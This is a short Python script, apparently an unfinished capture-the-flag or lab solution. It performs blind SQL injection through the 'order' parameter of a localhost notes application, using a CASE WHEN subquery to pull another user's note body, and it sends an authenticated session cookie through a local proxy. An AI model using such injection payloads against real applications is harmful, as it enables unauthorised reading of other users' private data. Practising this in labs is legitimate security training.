import requests
import urllib.parse
import time
import string

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080"
}

normal_user_cookies = {
    "session": "b59fc20c4e4348cba73ddfc96540a687.e1942e47cc4fca6b77ad35f48ac1daa86654f64401aa16ae4b685e0470b0dc1c"
}

flagger_cookies = {
    'session': '62f8d6c13d8f4b37ae9b729965b90eee.77f5a78acb547254987a06731796244e404c4725fc974394e3d9c4b78a13277f',
}

# ENCRYPT:SzJEVHVzRmhHaHZmU2pYak0yQVZzQT09OmUzOVBwcXNVWWdhMEw0YXpCVDV2WHRwYnBPRXFaSVpqMFpQRk1BMXNzODE1UGxIUXhwb0hLY2diNGd2VTRYYz06REpPTWk0S01pdmZ3cXVxNFBGcklTdz09


url = f"http://localhost:5000/notes%3F"
payload = "asc,(CASE WHEN (select substr((select body from notes where user=(select uuid from users where username='flagger')),'', 1) ) THEN timestamp ELSE uuid END )---"
params = urllib.parse.urlencode({"order": payload})

resp = requests.get(url+params, proxies=proxies, cookies=normal_user_cookies)

print (string.printable)